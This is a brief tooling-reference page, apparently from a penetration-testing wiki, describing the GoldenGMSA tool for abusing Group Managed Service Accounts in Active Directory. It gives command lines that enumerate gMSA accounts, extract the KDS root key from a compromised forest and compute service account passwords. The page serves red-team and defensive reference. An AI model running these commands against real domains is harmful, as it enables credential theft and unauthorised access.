---
tags:
  - tool
---
# GoldenGMSA

[GoldenGMSA](https://github.com/Semperis/GoldenGMSA) is a C# tool for abusing Group Managed Service Accounts (gMSA) in Active Directory.

## Capabilities

```powershell
# Enumerate gMSA accounts in a domain
.\GoldenGMSA.exe gmsainfo --domain $DOMAIN

# Retrieve gMSA password (online computation)
.\GoldenGMSA.exe compute --sid "$SID" --forest $FQDN --domain $DOMAIN

# Retrieve the KDS key associated with the gMSA (specifying our compromised forest, offline computation)
.\GoldenGMSA.exe kdsinfo --forest $FQDN

# Computer gMSA password manually (pwdid == msds-ManagedPasswordID, offline computation)
.\GoldenGMSA.exe compute --sid "$SID" --kdskey $KDSKEY --pwdid $PWDID
```
